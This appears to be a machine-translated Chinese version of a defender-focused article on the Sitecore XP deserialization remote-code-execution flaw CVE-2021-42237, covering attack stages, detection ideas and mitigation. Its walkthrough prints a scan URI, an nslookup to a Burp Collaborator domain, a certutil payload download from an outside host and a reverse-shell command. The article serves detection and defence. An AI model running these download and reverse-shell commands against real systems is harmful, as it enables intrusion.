# 从一个捍卫者的角度看 Sitecore XP 反序列化 RCE(CVE-2021–42237)

> 原文：<https://medium.com/nerd-for-tech/a-defenders-perspective-of-sitecore-xp-deserialization-rce-cve-2021-42237-dcd5355ca591?source=collection_archive---------1----------------------->

![](img/464e5beeb1ed34b439210d89f94c37c7.png)

路易斯·康的照片在 [Unsplash](https://unsplash.com/s/photos/code-execution?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)

Sitecore 的体验平台(XP)是一个. NET 企业内容管理系统(CMS)。Sitecore XP 为您提供了用于内容管理、数字营销以及分析和报告的工具。

## CVE-2021–42237

Sitecore XP 7.5 到 Sitecore XP 8.2 Update-7 的初始版本容易受到不安全的反序列化攻击，攻击者可能在机器上远程执行命令。利用此漏洞不需要身份验证或特殊配置。

# 入门前的关键概念

## 不安全的反序列化

序列化是将对象转换为静态字节流，可以保存到数据库或通过网络传输。反序列化是该过程的逆过程，从字节流重建数据结构或对象。

当不受信任的数据被用来滥用应用程序的逻辑，造成拒绝服务(DoS)攻击，甚至在反序列化后执行任意代码时，就会出现此漏洞。
当用户可控制的数据被网站反序列化时，这可能会使攻击者操纵序列化对象，将有害数据传递到应用程序代码中。

## Web 外壳

web 外壳通常是用典型的 web 开发编程语言(例如，ASP、PHP、JSP)编写的一小段恶意代码，攻击者将其植入 web 服务器以提供对服务器功能的远程访问和代码执行。

运行可疑进程(如“cmd.exe /c echo”、“certutil.exe”或“powershell.exe”)的 IIS 实例(w3wp.exe)会导致在可通过 web 访问的文件夹中创建脚本文件，这种情况很少见，通常是 web shell 活动的明显迹象。

## 打嗝合作者

Burp Suite 用来帮助发现多种漏洞的网络服务。
Collaborator 客户端可用于生成手动测试中使用的有效负载，并轮询 Collaborator 服务器使用这些有效负载产生的任何网络交互。

## CertUtil

用于处理证书的 Windows 二进制文件。

certutil 的预期用途是转储和显示证书颁发机构(CA)配置信息、配置证书服务、备份和还原 CA 组件以及验证证书、密钥对或证书链。但是，攻击者可以使用该工具通过 URL 模式(ftp://、http://等)从互联网获取数据。

# 典型的攻击会是什么样子？

1.  Sitecore XP 在 Report.ashx 文件中使用不安全的反序列化，攻击者可以利用该文件在系统上执行任意代码
2.  对易受攻击的服务器的扫描尝试

```
URI: “/sitecore/shell/ClientBin/Reporting/Report.ashx”
```

3.nslookup 从端点到 burpcollaborator 域

```
nslookup 5ouceXYZQtem.burpcollaborator.net
```

4.有效载荷下载

```
“C:\Windows\System32\cmd.exe” /c certutil -urlcache -f https://5ouceXYZQtem.burpcollaborator.netcertutil -f -urlcache http://A.B.C.D:8000/file.exe C:\Windows\Temp\file.exe
```

5.反向外壳

```
C:\Windows\Temp\file.exe A.B.C.D 4444 -e cmd
```

通过成功利用此漏洞，攻击者可以以运行 IIS 实例的用户身份执行任意代码。然后，攻击者可以使用“getsystem”命令来使用 RPCSS 模拟并获得系统级代码执行。

# 侦查思路

1.  certutil
    的可疑用法确定 certutil.exe 正在进行网络连接。对手可以滥用 certutil.exe 从远程网址下载证书或恶意软件。[链接](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_certutil_command.yml)为适马统治。
2.  可疑 nslookup 流量
    nslookup.exe 执行和查询*.burpcollaborator.net 域

# 减轻

建议的解决方案是升级到安全版本，最好是 Sitecore XP 9.0 或更高版本。或者，可以通过在所有服务器实例上删除“/sitecore/shell/client bin/Reporting/Report.ashx”中的 report . ashx 文件来缓解该漏洞。

# 参考

【https://blog.assetnote.io/2021/11/02/sitecore-rce/
[https://cve.mitre.org/cgi-bin/cvename.cgi?](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42237)[name = https://lolbas-project.github.io/lolbas/Binaries/Certutil/ CVE-2021-42237](https://blog.assetnote.io/2021/11/02/sitecore-rce/)